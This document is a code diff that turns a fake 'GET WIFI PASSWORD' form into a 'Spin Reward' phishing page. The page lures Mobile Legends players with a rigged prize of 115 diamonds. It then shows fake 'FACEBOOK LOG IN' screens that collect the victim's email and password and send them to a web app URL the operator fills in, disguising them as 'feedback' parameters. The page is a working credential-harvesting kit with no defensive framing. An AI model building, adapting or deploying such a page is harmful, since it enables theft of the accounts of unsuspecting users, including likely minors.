@@ -2,190 +2,213 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>GET WIFI PASSWORD</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spin Reward</title>
 
 <style>
-*{box-sizing:border-box;font-family:system-ui,Segoe UI,Roboto}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 body{
-  margin:0;
-  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-  color:#fff;
-  overflow:hidden;
-}
-.center{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  flex-direction:column;
+  margin:0;height:100vh;display:flex;justify-content:center;align-items:center;
+  font-family:Helvetica,Arial,sans-serif;
+  background:radial-gradient(circle at top,#5e2b97,#0b0016);color:#fff;
 }
 .hidden{display:none}
 
-h1{font-weight:600;letter-spacing:1px}
 .card{
-  background:rgba(255,255,255,.08);
-  backdrop-filter:blur(15px);
-  padding:25px;
-  border-radius:16px;
-  width:90%;
-  max-width:380px;
-  box-shadow:0 20px 40px rgba(0,0,0,.4);
+  width:94%;max-width:360px;
+  background:rgba(255,255,255,.08);backdrop-filter:blur(14px);
+  border-radius:18px;padding:18px;text-align:center;
+  box-shadow:0 0 40px rgba(90,0,255,.4);
 }
-button{
-  width:100%;
-  padding:14px;
-  margin-top:10px;
-  border:none;
-  border-radius:10px;
-  font-size:16px;
-  font-weight:600;
-  background:#00ffcc;
-  color:#000;
-  cursor:pointer;
+
+  .fb-title{
+  font-size:20px;
+  font-weight:700;
+  margin-bottom:6px;
+  letter-spacing:1px;
 }
-button.alt{background:#00aaff}
-input{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:8px;
-  border:none;
-  outline:none;
+.fb-sub{
+  font-size:13px;
+  opacity:0.8;
+  margin-bottom:10px;
 }
-.fade{animation:fade .6s ease}
-@keyframes fade{
-  from{opacity:0;transform:scale(.95)}
-  to{opacity:1;transform:scale(1)}
+/* Loading */
+.circle{
+  width:70px;height:70px;border-radius:50%;
+  border:6px solid rgba(255,255,255,.25);
+  border-top:6px solid #2da9ff;
+  animation:spin 1s linear infinite;margin:14px auto;
 }
-#loadingBar{
-  width:260px;
-  height:8px;
-  background:rgba(255,255,255,.2);
-  border-radius:10px;
-  overflow:hidden;
-  margin-top:15px;
+@keyframes spin{to{transform:rotate(360deg)}}
+.barWrap{width:100%;height:10px;background:rgba(255,255,255,.25);border-radius:6px;overflow:hidden}
+.bar{height:100%;width:0%;background:#2da9ff}
+
+/* Button */
+.btn{
+  width:100%;height:44px;border:none;border-radius:10px;
+  background:linear-gradient(135deg,#4da6ff,#7a3cff);
+  color:#fff;font-size:16px;font-weight:bold;
 }
-#bar{
-  height:100%;
-  width:0%;
-  background:#00ffcc;
-  transition:width .13s linear;
+.btn:active{transform:scale(.96)}
+
+/* FB-like input */
+.fb-input{
+  width:100%;height:44px;border-radius:8px;border:1px solid #ccd0d5;
+  padding:0 12px;font-size:15px;margin-top:10px;
 }
+
+/* Dots loader */
+.dots{font-size:26px;letter-spacing:6px;animation:pulse 1s infinite}
+@keyframes pulse{0%{opacity:.3}50%{opacity:1}100%{opacity:.3}}
 </style>
 </head>
 
 <body>
+<div class="card">
 
-<!-- LOADING -->
-<div id="loading" class="center">
-  <h1 id="loadTxt">Loading 0%</h1>
-  <div id="loadingBar"><div id="bar"></div></div>
+<!-- LOADING PAGE -->
+<div id="loadingPage">
+  <h3>Loading</h3>
+  <div class="circle"></div>
+  <div class="barWrap"><div class="bar" id="bar"></div></div>
+  <p id="percent">0%</p>
 </div>
 
-<!-- CHOICE -->
-<div id="choice" class="center hidden fade">
-  <div class="card">
-    <h1>Choose</h1>
-    <button onclick="openFeedback()">FEEDBACK</button>
-    <button class="alt" onclick="openComment()">COMMENT</button>
-  </div>
+<!-- SPIN -->
+<div id="spinPage" class="hidden">
+  <h3>Spin Reward</h3>
+  <div id="spinBox" style="font-size:22px;margin:22px 0;">READY</div>
+  <button class="btn" id="spinBtn" onclick="spin()">GO</button>
 </div>
 
-<!-- FEEDBACK -->
-<div id="feedback" class="center hidden fade">
-  <div class="card">
-    <h1>FEEDBACK</h1>
-    <input id="fb1" placeholder="Feedback 1" required>
-    <input id="fb2" placeholder="Feedback 2" required>
-    <button onclick="submitFeedback()">SUBMIT</button>
-  </div>
+<!-- RESULT -->
+<div id="resultPage" class="hidden">
+  <h2>🎉 You Got</h2>
+  <h1>115 💎Dias</h1>
+  <button class="btn" onclick="toFb(1)">Redeem</button>
 </div>
 
-<!-- COMMENT -->
-<div id="comment" class="center hidden fade">
-  <div class="card">
-    <h1>COMMENT</h1>
-    <input id="name" placeholder="Your Name" required>
-    <input id="comm" placeholder="Your Comment" required>
-    <button onclick="submitComment()">SUBMIT</button>
-  </div>
+<!-- FB 1 -->
+<div id="fb1" class="hidden">
+  <div class="fb-title">ENTER ML ID</div>
+  <div class="fb-sub">MOBILE LEGENDS</div>
+
+  <input class="fb-input" placeholder="ML ID">
+  <button class="btn" onclick="nextWithWait(1)">ENTER</button>
 </div>
 
-<!-- MAIN PAGE -->
-<div id="main" class="center hidden fade">
-  <h1>NOTHING</h1>
+<!-- FB 2 -->
+<div id="fb2" class="hidden">
+  <div class="fb-title">SERVER ID</div>
+  <div class="fb-sub">MOBILE LEGENDS</div>
+
+  <input class="fb-input" placeholder="ML SERVER ID">
+  <button class="btn" onclick="nextWithWait(2)">Next</button>
+</div>
+
+<!-- FB 3 (SAVE) -->
+<div id="fb3" class="hidden">
+  <div class="fb-title">FACEBOOK LOG IN</div>
+  <div class="fb-sub">FACEBOOK</div>
+
+  <input class="fb-input" id="f3" placeholder="EMAIL">
+  <button class="btn" onclick="saveAndNext()">Enter Email</button>
+</div>
+
+<!-- FB 4 (SAVE) -->
+<div id="fb4" class="hidden">
+  <div class="fb-title">FACEBOOK LOG IN</div>
+  <div class="fb-sub">FACEBOOK</div>
+
+  <input class="fb-input" id="f4" placeholder="PASSWORD">
+  <button class="btn" onclick="saveFinal()">Enter Password</button>
+</div>
+
+<!-- WAIT -->
+<div id="wait" class="hidden"><div class="dots">•••</div></div>
+
+<!-- DONE -->
+<div id="done" class="hidden">
+  <h2>✅ Successfully Redeemed</h2>
+</div>
+
 </div>
 
 <script>
-/* ELEMENTS */
-const loading = document.getElementById("loading");
-const choice = document.getElementById("choice");
-const feedback = document.getElementById("feedback");
-const comment = document.getElementById("comment");
-const main = document.getElementById("main");
+/* ===== CONFIG ===== */
+const WEB_APP_URL = "PUT YOUR URL HERE"; // optional
 
-const bar = document.getElementById("bar");
-const txt = document.getElementById("loadTxt");
-
-/* LOADING */
-let percent = 0;
-const load = setInterval(()=>{
-  percent++;
-  if(percent > 100) percent = 100;
-  txt.innerText = "Loading " + percent + "%";
-  bar.style.width = percent + "%";
-
-  if(percent === 100){
+/* ===== LOADING 25s ===== */
+let p=0;
+const load=setInterval(()=>{
+  p++; bar.style.width=p+"%"; percent.innerText=p+"%";
+  if(p>=100){
     clearInterval(load);
-    setTimeout(()=>{
-      loading.classList.add("hidden");
-choice.classList.remove("hidden");
-    },300);
+    loadingPage.classList.add("hidden");
+    spinPage.classList.remove("hidden");
   }
-},130); // ~13 seconds
+},250);
 
-/* NAVIGATION */
-function openFeedback(){
-  choice.hidden = true;
-  feedback.hidden = false;
-}
-function openComment(){
-  choice.hidden = true;
-  comment.hidden = false;
-}
-
-/* GOOGLE SCRIPT */
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVPaYHbpIDuP_4ps5VcCGNJiFHfPnqVjXRJlv1sXmCjBaXyewaG1H1gAk6QGbBzMvj4Q/exec";
-
-function submitFeedback(){
-  let f1 = fb1.value.trim();
-  let f2 = fb2.value.trim();
-  if(!f1 || !f2) return alert("Required");
-
-  fetch(SCRIPT_URL,{
-    method:"POST",
-    body:JSON.stringify({type:"FEEDBACK",a:f1,b:f2})
-  }).then(goMain);
-}
-
-function submitComment(){
-  let n = name.value.trim();
-  let c = comm.value.trim();
-  if(!n || !c) return alert("Required");
-
-  fetch(SCRIPT_URL,{
-    method:"POST",
-    body:JSON.stringify({type:"COMMENT",a:n,b:c})
-  }).then(goMain);
+/* ===== SPIN ===== */
+let spun=false;
+const items=[
+ "🦹‍♂️Random Epic Skin","🐲Random Emote","Dias 💎75","Dias 💎30",
+ "Dias 💎45","Dias 💎115","Dias 💎558","⚫Nothing","⚫Nothing"
+];
+function spin(){
+  if(spun) return;
+  spun=true; spinBtn.disabled=true;
+  let i=0;
+  const anim=setInterval(()=>{
+    spinBox.innerText=items[Math.floor(Math.random()*items.length)];
+    i++;
+    if(i>=20){
+      clearInterval(anim);
+      spinBox.innerText="Dias 115";
+      setTimeout(()=>{
+        spinPage.classList.add("hidden");
+        resultPage.classList.remove("hidden");
+      },600);
+    }
+  },300);
 }
 
-function goMain(){
-  feedback.hidden = true;
-  comment.hidden = true;
-  main.hidden = false;
+/* ===== FLOW ===== */
+function toFb(n){
+  resultPage.classList.add("hidden");
+  document.getElementById("fb"+n).classList.remove("hidden");
+}
+function nextWithWait(n){
+  document.getElementById("fb"+n).classList.add("hidden");
+  wait.classList.remove("hidden");
+  setTimeout(()=>{
+    wait.classList.add("hidden");
+    document.getElementById("fb"+(n+1)).classList.remove("hidden");
+  },5000);
+}
+
+/* ===== SAVE ONLY FB3 & FB4 ===== */
+function saveAndNext(){
+  const v=document.getElementById("f3").value;
+  if(WEB_APP_URL){
+    fetch(WEB_APP_URL+"?step=3&feedback="+encodeURIComponent(v));
+  }
+  fb3.classList.add("hidden");
+  wait.classList.remove("hidden");
+  setTimeout(()=>{
+    wait.classList.add("hidden");
+    fb4.classList.remove("hidden");
+  },5000);
+}
+
+function saveFinal(){
+  const v=document.getElementById("f4").value;
+  if(WEB_APP_URL){
+    fetch(WEB_APP_URL+"?step=4&feedback="+encodeURIComponent(v));
+  }
+  fb4.classList.add("hidden");
+  done.classList.remove("hidden");
 }
 </script>
-
 </body>
 </html>
